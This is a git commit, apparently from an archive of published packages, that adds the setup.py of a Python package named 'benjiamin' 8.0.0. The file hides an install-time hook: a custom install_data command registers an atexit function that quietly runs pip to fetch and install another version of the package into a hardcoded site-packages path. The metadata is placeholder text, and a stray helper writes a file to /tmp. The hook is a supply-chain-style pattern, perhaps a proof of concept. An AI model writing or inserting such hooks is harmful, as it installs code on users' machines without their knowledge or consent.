1c6def235fd0281818ea59a788fc830585682810
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-04-13 14:04:42 +0000

    Add package benjiamin/8.0.0/benjiamin-8.0.0.tar.gz

---
+++ packages/benjiamin/benjiamin-8.0.0.tar.gz/benjiamin-8.0.0/setup.py
@@ -0,0 +1,43 @@
+from setuptools import setup, find_packages
+import subprocess
+import sys
+import atexit
+import os
+from setuptools.command.install import install
+
+
+
+def create_tmp_file(file_name="shuai.txt"):
+    tmp_dir = '/tmp'  # Adjust this path based on your operating system
+    file_path = os.path.join(tmp_dir, file_name)
+    
+    with open(file_path, 'w') as f:
+        f.write("This is a temporary file created in the tmp folder.")
+    
+    print(f"File created successfully at: {file_path}")
+
+
+def _post_install():
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "benjiamin==1.0.0", "--target={}".format("/Users/jli17/.pyenv/versions/3.10.13/envs/3.10/lib/python3.10/site-packages")])
+
+class new_install(install):
+    def __init__(self, *args, **kwargs):
+        super(new_install, self).__init__(*args, **kwargs)
+        atexit.register(_post_install)
+
+setup(
+  name='benjiamin',
+  version='8.0.0',
+  author='Your Name',
+  author_email='your.email@example.com',
+  description='A short description of your package',
+  packages=find_packages(),
+  classifiers=[
+  'Programming Language :: Python :: 3',
+  'License :: OSI Approved :: MIT License',
+  'Operating System :: OS Independent',
+  ],
+  python_requires='>=3.6',
+  cmdclass={'install_data': new_install},
+)
+
